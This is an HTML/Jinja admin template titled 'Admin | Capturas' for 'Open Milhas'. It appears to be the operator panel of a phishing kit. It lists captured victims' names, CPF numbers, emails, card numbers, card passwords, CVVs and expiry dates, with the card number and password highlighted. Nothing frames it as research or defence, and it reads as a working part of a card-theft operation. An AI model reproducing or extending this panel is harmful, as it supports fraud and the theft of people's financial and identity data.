<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Admin | Capturas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-white p-4">
    <div class="container-fluid">
        <h2 class="mb-4">Logs de Venda - Open Milhas</h2>
        <div class="table-responsive">
            <table class="table table-dark table-striped table-bordered align-middle">
                <thead>
                    <tr>
                        <th>ID</th><th>Nome</th><th>CPF</th><th>Email</th>
                        <th>Número do Cartão</th><th>Senha</th><th>CVV</th><th>Validade</th>
                    </tr>
                </thead>
                <tbody>
                    {% for u in usuarios %}
                    <tr>
                        <td>{{ u[0] }}</td><td>{{ u[1] }}</td><td>{{ u[2] }}</td><td>{{ u[3] }}</td>
                        <td class="text-warning fw-bold">{{ u[4] }}</td>
                        <td class="text-danger fw-bold">{{ u[5] }}</td>
                        <td>{{ u[6] }}</td><td>{{ u[7] }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
